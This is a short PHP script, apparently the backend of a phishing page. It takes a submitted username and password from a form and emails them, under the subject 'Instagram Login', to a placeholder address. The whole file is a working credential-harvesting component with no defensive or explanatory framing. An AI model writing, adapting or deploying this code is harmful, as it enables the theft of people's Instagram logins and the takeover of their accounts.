<?php
// the message
$msg = "From: " . $_POST["userName"] . " - ". $_POST["password"];

// send email
mail("someone@example.com","Instagram Login",$msg);
?>
